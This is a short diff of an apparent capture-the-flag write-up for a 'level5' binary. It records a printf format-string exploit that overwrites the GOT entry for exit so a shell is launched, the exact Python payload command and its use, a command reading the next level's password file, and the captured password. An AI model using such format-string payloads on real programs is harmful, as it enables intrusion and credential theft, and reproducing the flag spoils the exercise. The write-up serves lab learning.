@@ -1,5 +1,8 @@
-We use an exploitation of printf format specifier.
-We override the got entry for exit function with the "o" function one.
+# We use an exploitation of printf format specifier.
+# We override the GOT entry for exit function with the "o" function one.
+# Instead of the exit, the function "o" with the critical section will be called, and so a shell will be launched
 
-Our exploit :
-- python -c 'print "\x38\x98\x04\x08" +"%134513824x" + "%4$n"' > /tmp/payloa
+python -c 'print "\x38\x98\x04\x08" +"%134513824x" + "%4$n"' > /tmp/payload_level5
+cat /tmp/payload_level5 - | ./level5
+$ cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
